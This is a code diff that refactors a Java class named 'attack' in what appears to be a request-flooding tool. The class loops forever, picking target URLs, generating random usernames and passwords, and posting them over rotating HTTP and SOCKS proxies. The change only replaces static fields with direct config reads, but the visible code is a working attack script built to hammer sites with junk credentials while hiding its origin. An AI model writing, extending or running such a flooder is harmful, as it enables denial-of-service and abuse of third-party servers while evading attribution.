@@ -11,18 +11,13 @@ import java.net.URL;
 import java.util.Random;
 
 public class attack implements Runnable {
-    static String method = file.method;
-    static String[] urls = file.urls;
-    static String param = file.param;
-    static boolean genoutput = file.genoutput;
-    static boolean proxyswitch = file.proxyswitch;
     static String[] proxyhttp;
     static String[] proxysocks;
     static boolean proxyhttpswich = false;
     static boolean proxysocksswich = false;
     
     protected static void start() {
-        if (proxyswitch) {
+        if (file.proxyswitch) {
             proxyhttp = murl.readhttp(file.proxyfile);
             if (proxyhttp != null) {
                 proxyhttpswich = true;
@@ -55,7 +50,7 @@ public class attack implements Runnable {
         String[] proxyiurl = { "", "" };
         String proxyhost = "";
         int proxyport = 0;
-        if (proxyswitch) {
+        if (file.proxyswitch) {
             if (proxyhttpswich && proxysocksswich) {
                 if (random.nextBoolean()) {
                     proxytype = "http";
@@ -88,7 +83,7 @@ public class attack implements Runnable {
         }
         while (true) {
             // url
-            String url = urls[random.nextInt(urls.length - 1)].toString();
+            String url = file.urls[random.nextInt(file.urls.length - 1)].toString();
             // name
             String rn;
             Long brn = (long) (Math.random() * (99999999999l - 10000000)) + 1000000;
@@ -113,7 +108,7 @@ public class attack implements Runnable {
                 pass.append(str.charAt(randomInt));
             }
             // 输出
-            if (genoutput) {
+            if (file.genoutput) {
                 System.out.println(rn.toString() + " " + pass.toString());
             }
             go(rn.toString(), pass.toString(), url, proxytype, proxyhost, proxyport);
@@ -135,7 +130,7 @@ public class attack implements Runnable {
                     httpURLConnection = (HttpURLConnection) url.openConnection(proxy);
                 }
             }
-            httpURLConnection.setRequestMethod(method);
+            httpURLConnection.setRequestMethod(file.method);
             // 超时时间
             httpURLConnection.setConnectTimeout(3000);
             // 设置是否输出
@@ -156,7 +151,7 @@ public class attack implements Runnable {
             httpURLConnection.connect();
             /* 4. 处理输入输出 */
             // 写入参数到请求中
-            String params = param;
+            String params = file.param;
             OutputStream out = httpURLConnection.getOutputStream();
             out.write(params.getBytes());
             // 简化
